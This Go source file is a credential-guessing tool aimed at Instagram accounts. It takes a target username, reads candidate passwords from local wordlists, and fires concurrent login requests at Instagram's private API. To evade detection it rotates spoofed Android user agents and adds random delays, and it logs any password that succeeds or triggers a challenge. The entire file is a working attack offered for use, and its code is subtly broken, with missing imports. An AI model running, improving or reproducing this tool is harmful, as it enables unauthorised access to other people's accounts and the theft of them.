package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

const (
	API_URL      = "https://i.instagram.com/api/v1/"
	TIMEOUT      = 10 * time.Second
	CURRENT_TIME = "2025-05-23 23:14:48"
	CURRENT_USER = "monsmain"
)

var userAgents = []string{
	"Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977",
	"Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743",
	"Instagram 329.0.0.29.120 Android (31/12; 420dpi; 1080x2400; samsung; SM-A515F; a51; exynos9611; en_US; 329000029)",
	"Instagram 328.0.0.13.119 Android (31/12; 480dpi; 1080x2400; samsung; SM-A715F; a71; qcom; en_US; 328000013)",
	"Instagram 327.0.0.17.64 Android (30/11; 440dpi; 1080x2340; Xiaomi; Mi 9T; davinci; qcom; en_US; 327000017)",
	"Instagram 326.0.0.13.109 Android (29/10; 420dpi; 1080x2340; Google; Pixel 4a; sunfish; qcom; en_US; 326000013)",
	"Instagram 325.0.0.15.110 Android (30/11; 480dpi; 1080x2400; Xiaomi; Redmi Note 10 Pro; sweet; qcom; en_US; 325000015)",
	"Instagram 324.0.0.22.99 Android (31/12; 440dpi; 1080x2340; OnePlus; DN2103; OnePlusNord2T; mt6877; en_US; 324000022)",
	"Instagram 323.0.0.20.66 Android (30/11; 480dpi; 1080x2400; Samsung; SM-A325F; a32; qcom; en_US; 323000020)",
	"Instagram 322.0.0.16.170 Android (30/11; 480dpi; 1080x2340; Xiaomi; M2007J3SY; apollon; qcom; en_US; 322000016)",
	"Instagram 321.0.0.13.113 Android (29/10; 420dpi; 1080x2340; Samsung; SM-G973F; beyond1; exynos9820; en_US; 321000013)",
	"Instagram 320.0.0.18.118 Android (31/12; 420dpi; 1080x2340; Xiaomi; Mi 10T Pro; apollo; qcom; en_US; 320000018)",
	"Instagram 319.0.0.31.119 Android (31/12; 480dpi; 1080x2400; Samsung; SM-G991B; o1q; exynos2100; en_US; 319000031)",
	"Instagram 318.0.0.14.109 Android (30/11; 440dpi; 1080x2340; Xiaomi; Mi 11 Lite; courbet; qcom; en_US; 318000014)",
	"Instagram 317.0.0.20.170 Android (30/11; 480dpi; 1080x2340; Samsung; SM-A525F; a52; qcom; en_US; 317000020)",
	"Instagram 316.0.0.20.170 Android (30/11; 480dpi; 1080x2400; Xiaomi; Redmi Note 8 Pro; begonia; mt6785; en_US; 316000020)",
	"Instagram 315.0.0.34.119 Android (31/12; 480dpi; 1080x2340; Samsung; SM-M526B; m52x; qcom; en_US; 315000034)",
	"Instagram 314.0.0.34.119 Android (29/10; 420dpi; 1080x2340; OnePlus; ONEPLUS A6013; OnePlus6T; qcom; en_US; 314000034)",
	"Instagram 313.0.0.34.119 Android (30/11; 440dpi; 1080x2340; Google; Pixel 5; redfin; qcom; en_US; 313000034)",
	"Instagram 312.0.0.12.119 Android (31/12; 480dpi; 1080x2400; Samsung; SM-A715F; a71; qcom; en_US; 312000012)",
	"Instagram 311.0.0.12.119 Android (31/12; 420dpi; 1080x2340; Xiaomi; Mi 9T; davinci; qcom; en_US; 311000012)",
	"Instagram 310.0.0.21.119 Android (30/11; 480dpi; 1080x2400; Xiaomi; M2101K6G; curtana; qcom; en_US; 310000021)",
}

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

type LoginResult struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Success  bool   `json:"success"`
	Time     string `json:"time"`
	Message  string `json:"message"`
}

func main() {
	setupLogger()

	fmt.Println("=== Instagram Login Tool (Improved) ===")
	fmt.Printf("Time: %s\n", CURRENT_TIME)
	fmt.Printf("User: %s\n\n", CURRENT_USER)

	username := getUsername()
	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt or password.json!")
		return
	}
	fmt.Printf("\nLoaded %d passwords\n", len(passwords))

	fmt.Println("\nStarting login attempts...\n")
	found := make(chan LoginResult, 1)
	progress := make(chan int, len(passwords))
	var wg sync.WaitGroup

	workerCount := 5
	jobs := make(chan string, len(passwords))
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for password := range jobs {
				res := tryLogin(username, password)
				progress <- 1
				if res.Success {
					select {
					case found <- res:
					default:
					}
					return
				}
				time.Sleep(randomDuration(5, 10))
			}
		}()
	}

	go func() {
		for _, password := range passwords {
			jobs <- password
		}
		close(jobs)
	}()

	go showProgressBar(len(passwords), progress)

	select {
	case res := <-found:
		fmt.Printf("\n✅ PASSWORD FOUND: %s\n", res.Password)
		fmt.Printf("Username: %s\n", username)
		fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
		saveResultJSON(res)
	case <-waitGroupTimeout(&wg, 60*time.Minute):
		fmt.Println("\n❌ No valid password found in the given time.")
		saveResultJSON(LoginResult{
			Username: username,
			Password: "",
			Success:  false,
			Time:     CURRENT_TIME,
			Message:  "Not found",
		})
	}
}

func setupLogger() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
	}
}

func getUsername() string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter Instagram username: ")
	username, _ := reader.ReadString('\n')
	return trim(username)
}

func showProgressBar(total int, progress <-chan int) {
	completed := 0
	for range progress {
		completed++
		printProgress(completed, total)
	}
}

func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) <-chan struct{} {
	done := make(chan struct{})
	go func() {
		c := make(chan struct{})
		go func() {
			wg.Wait()
			close(c)
		}()
		select {
		case <-c:
		case <-time.After(timeout):
		}
		close(done)
	}()
	return done
}

func tryLogin(username, password string) LoginResult {
	loginUrl := API_URL + "accounts/login/"
	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Request error"}
	}

	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	client := &http.Client{Timeout: TIMEOUT}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "HTTP error"}
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Read error"}
	}

	log.Printf("Raw response: %s\n", string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Parse error"}
	}

	success := response.Status == "ok" || strings.Contains(string(body), "logged_in_user")

	if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
		return LoginResult{Username: username, Password: password, Success: true, Time: CURRENT_TIME, Message: "challenge or success"}
	}

	msg := response.Message
	if response.ErrorType == "bad_password" {
		msg = "invalid password"
	}
	if response.ErrorType == "invalid_user" {
		msg = "invalid username"
	}
	return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: msg}
}

func loadPasswords() []string {
	var passwords []string

	// Try to load from password.txt
	file, err := os.Open("password.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			pass := strings.TrimSpace(scanner.Text())
			if pass != "" {
				passwords = append(passwords, pass)
			}
		}
	} else {
		log.Printf("Error opening password file: %v", err)
	}

	// Try to load from password.json (optional)
	fileJSON, errj := os.Open("password.json")
	if errj == nil {
		defer fileJSON.Close()
		var jsonPasswords []string
		decoder := json.NewDecoder(fileJSON)
		if err := decoder.Decode(&jsonPasswords); err == nil {
			passwords = append(passwords, jsonPasswords...)
		}
	}

	return passwords
}

func saveResultJSON(result LoginResult) {
	file, err := os.OpenFile("results.json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	enc := json.NewEncoder(file)
	err = enc.Encode(result)
	if err != nil {
		log.Printf("Error encoding result: %v", err)
	}
}

func trim(s string) string {
	return strings.TrimSpace(s)
}

func maskPassword(password string) string {
	if len(password) <= 4 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}

func printProgress(current, total int) {
	percent := (current * 100) / total
	bar := strings.Repeat("█", percent/2) + strings.Repeat("-", 50-percent/2)
	os.Stdout.WriteString(
		"\r[" + bar + "] " +
			fmt.Sprintf(" %d/%d ", current, total) +
			fmt.Sprintf(" %d%%", percent))
	if current == total {
		os.Stdout.WriteString("\n")
	}
}

func randomDuration(min, max int) time.Duration {
	return time.Duration(rand.Intn(max-min+1)+min) * time.Second
}
